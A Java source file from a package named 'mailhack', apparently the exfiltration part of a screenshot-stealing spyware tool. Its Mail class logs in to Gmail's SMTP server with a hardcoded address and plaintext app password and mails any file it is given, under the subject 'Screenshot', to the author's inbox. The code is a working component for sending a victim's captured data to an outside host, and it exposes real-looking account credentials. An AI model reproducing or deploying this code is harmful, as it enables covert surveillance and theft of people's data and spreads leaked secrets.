/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package mailhack;

import java.util.Properties;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.activation.DataHandler;
import javax.activation.FileDataSource;
import javax.mail.BodyPart;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.NoSuchProviderException;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

/**
 *
 * @author Jhoan
 */
public class Mail {

    private String emailfrom = "salasbandam3@gmail.com";
    private String password = "hvllbxvrsvqljwgj";
    private String emailto = "salasbandam3@gmail.com";
    private Session sesion;
    private MimeMessage mmessage;
    private Properties mProperties;

    public void CreateEmail(String direccionArchivo, String nombreArchivo) {
        mProperties = new Properties();
        mProperties.put("mail.smtp.host", "smtp.gmail.com");
        mProperties.put("mail.smtp.ssl.trust", "smtp.gmail.com");
        mProperties.setProperty("mail.smtp.starttls.enable", "true");
        mProperties.setProperty("mail.smtp.port", "587");
        mProperties.setProperty("mail.smtp.user", emailfrom);
        mProperties.setProperty("mail.smtp.ssl.protocols", "TLSv1.2");
        mProperties.setProperty("mail.smtp.auth", "true");
        try {
            sesion = Session.getDefaultInstance(mProperties);
            mmessage = new MimeMessage(sesion);
            try {
                mmessage.setFrom(new InternetAddress(emailfrom));
                mmessage.setRecipient(Message.RecipientType.TO, new InternetAddress(emailto));
                mmessage.setSubject("Screenshot");
                mmessage.setText("olajakiao", "ISO-8859-1", "html");
                BodyPart img = new MimeBodyPart();
                BodyPart txt = new MimeBodyPart();
                img.setDataHandler(new DataHandler(new FileDataSource(direccionArchivo)));
                img.setFileName(nombreArchivo);
                txt.setText("Mas jakiao");
                Multipart mp = new MimeMultipart();
                mp.addBodyPart(img);
                mp.addBodyPart(txt);
                mmessage.setContent(mp);

            } catch (MessagingException e) {
                System.out.println(e);
            }

        } catch (Exception e) {
            System.out.println(e);

        }

    }

    public void sendEmail() {
        try {
            Transport mTransport = sesion.getTransport("smtp");
            mTransport.connect(emailfrom, password);
            mTransport.sendMessage(mmessage, mmessage.getRecipients(Message.RecipientType.TO));
            mTransport.close();

        } catch (NoSuchProviderException ex) {

        } catch (MessagingException ex) {
            Logger.getLogger(EmailSenderService.class.getName()).log(Level.SEVERE, null, ex);
        }

    }
}
